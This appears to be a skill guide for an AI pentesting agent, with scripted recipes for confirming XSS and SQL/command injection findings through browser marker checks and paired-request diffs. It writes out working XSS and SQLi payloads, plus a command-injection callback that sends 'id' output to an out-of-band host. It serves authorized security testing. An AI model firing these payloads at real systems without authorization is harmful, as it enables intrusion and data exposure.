---
name: deterministic_verification
description: Scripted, non-LLM-judgment confirmation for XSS and injection findings — a marker round-trip via agent-browser eval and a paired-request oracle diff, to replace "I looked at it and it seems to have worked" with a script that actually says pass/fail
---

# Deterministic Verification

XBOW (the AI pentesting agent currently ranked #1 on HackerOne's public
leaderboard) confirms XSS by driving a headless browser and checking whether
the injected payload *actually executed* — a scripted pass/fail — rather than
inferring it from a screenshot or a response-body substring match. Apply the
same discipline here: for the two vuln classes where "did it really fire" is
easy to get wrong by eyeballing (XSS execution, injection oracles), run the
recipe below and quote its literal output as evidence before setting
``confidence: "high"`` on ``create_vulnerability_report``.

This is not a replacement for ``counterevidence``/``fix_verification`` — it's
a stronger evidence *input* to them. A candidate that fails the script below
is not confirmed, regardless of how convincing the response body looked.

## XSS: marker round-trip (not a screenshot, not an alert you "saw")

A screenshot of an alert box is judgment, not proof — and payloads like
``alert(1)`` can coincidentally match cached test artifacts or a WAF's own
block page. Use a payload that sets a **unique, per-test global** the
agent-browser CLI can then read back deterministically:

```bash
# 1. Generate a per-test marker so a stale/cached page can never false-positive
MARKER="strix_xss_$(date +%s%N | sha256sum | head -c 12)"

# 2. Inject a payload that sets window[MARKER] = true when it executes, e.g.:
#    <script>window["strix_xss_ab12cd34ef56"]=true</script>
#    or, for an attribute/event-handler sink: onerror="window['MARKER']=true"

agent-browser open "https://target.tld/search?q=<script>window['$MARKER']=true</script>"

# 3. Read the marker back — this is the deterministic verdict, not a visual check
agent-browser eval "window['$MARKER'] === true"
```

`eval`'s output is the literal boolean the page's own JS state holds — `true`
means the injected script genuinely ran in that page context, `false`/`undefined`
means it did not (encoded, stripped, CSP-blocked, wrong context, etc). Quote
this exact command and its output in `evidence`. For a DOM-based sink or one
reached via multiple steps (fill a form, submit, wait for navigation), run the
injection through the normal `agent-browser` interaction flow (`fill`/`click`/
`wait`) and do the marker-read as the final step — the round-trip logic is the
same regardless of how the payload got there.

**CSP/Trusted-Types claims need the same treatment**: don't accept "CSP should
block this" as counterevidence without checking. Read the actual header
(`agent-browser eval "document.head.querySelector('meta[http-equiv=\"Content-Security-Policy\"]')?.content ?? 'none'"`
or check the response headers directly) and, if a policy is present, confirm
whether your specific sink/payload shape is actually restricted by it — an
`unsafe-inline` or missing `script-src` directive means the stated defense
isn't real.

## Injection oracles (SQLi / command injection): paired-request diff

A single "the response looked different" observation is not an oracle — it
could be normal application behavior. Prove causation by diffing **two
requests that differ only in the injected predicate**, and let a script (not
your reading of two response bodies side by side) report the verdict:

**Boolean-based:**
```bash
# 0. Control first: two requests with the SAME predicate must be identical.
#    If they aren't, the page has per-request noise (CSRF token, timestamp,
#    request ID, ads) and a raw full-body diff is not a valid oracle here —
#    fall back to a narrower signal (byte length, row count, a specific
#    extracted value) instead of diffing full bodies.
curl -s "https://target.tld/item?id=1 AND 1=1" -o /tmp/true_a.html
curl -s "https://target.tld/item?id=1 AND 1=1" -o /tmp/true_b.html
diff /tmp/true_a.html /tmp/true_b.html || echo "NOISY PAGE - full-body diff unreliable, use byte length or a specific marker instead"

# 1. Only once the control is clean, diff the actual true/false pair.
curl -s "https://target.tld/item?id=1 AND 1=1" -o /tmp/true.html
curl -s "https://target.tld/item?id=1 AND 1=2" -o /tmp/false.html
diff /tmp/true.html /tmp/false.html && echo "IDENTICAL - no boolean oracle" || echo "DIFFERS - oracle confirmed"
```
A real oracle differs on the injected predicate, holds the control-pair
identical, and is stable on repeat runs. If the control pair itself differs,
or the true/false diff isn't reproducible across 2-3 repeats of the same
pair, that's noise, not a finding — say so in `counterevidence` and set
`confidence: "low"`/`"medium"`, don't round up.

**Time-based** (when boolean/error channels are blind):
```bash
T1=$(curl -s -o /dev/null -w "%{time_total}" "https://target.tld/item?id=1")
T2=$(curl -s -o /dev/null -w "%{time_total}" "https://target.tld/item?id=1;SELECT SLEEP(5)--")
python3 -c "print('DELAY CONFIRMED' if float('$T2') - float('$T1') > 4.0 else 'no delay')"
```
Run the baseline (`T1`) and the delayed request (`T2`) at least twice each and
require the delay to hold consistently — a single slow request can be network
jitter, not proof. Command injection's `sleep N` variant is the same recipe
against the OS-level primitive instead of the DBMS one.

**Command injection specifically**: prefer an out-of-band callback
(`curl http://<oast-domain>/$(id)` style, or your OAST provider's payload) over
a blind time-delay when one is reachable — a received callback with the actual
command output embedded in the request path/headers is a stronger, unambiguous
verdict than a timing measurement.

## What this does NOT cover

This skill is scoped to the two classes where "did the script really run" /
"is this predicate actually controlling the response" is easy to misjudge
visually. It is not a general replacement for manual verification on every
finding — most vuln classes (IDOR, auth bypass, business logic, SSRF) are
already provable with a direct request/response pair and don't need a scripted
oracle. Reach for this skill specifically for XSS execution claims and
injection-oracle claims, not as a blanket pre-filing ritual.

## Summary

Before filing an XSS finding as `confidence: "high"`, read back a
per-test-unique marker via `agent-browser eval` rather than trusting a
screenshot. Before filing a SQLi/command-injection finding on a boolean or
time-based channel, diff two requests that differ only in the injected
predicate — and require the diff to reproduce — rather than eyeballing one
response. Quote the exact command and its literal output as `evidence`.
